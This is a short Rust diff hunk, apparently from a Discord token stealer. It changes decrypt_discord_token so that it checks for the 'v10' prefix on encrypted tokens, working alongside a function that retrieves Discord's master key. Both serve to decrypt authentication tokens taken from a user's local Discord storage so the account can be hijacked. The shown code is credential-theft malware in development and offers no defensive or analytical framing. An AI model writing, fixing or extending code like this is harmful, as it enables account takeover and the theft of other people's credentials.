@@ -476,7 +476,7 @@ fn get_discord_master_key(discord_dir: &Path) -> Option<Vec<u8>> {
 
 fn decrypt_discord_token(master_key: &[u8], encrypted_token_b64: &str) -> Option<String> {
     let encrypted_bytes = base64::engine::general_purpose::STANDARD.decode(encrypted_token_b64).ok()?;
-    if encrypted_bytes.len() < 31 || &encrypted_bytes[0..3] != b"DPAPI" {
+    if encrypted_bytes.len() < 31 || &encrypted_bytes[0..3] != b"v10" {
         return None;
     }
     let nonce = &encrypted_bytes[3..15];
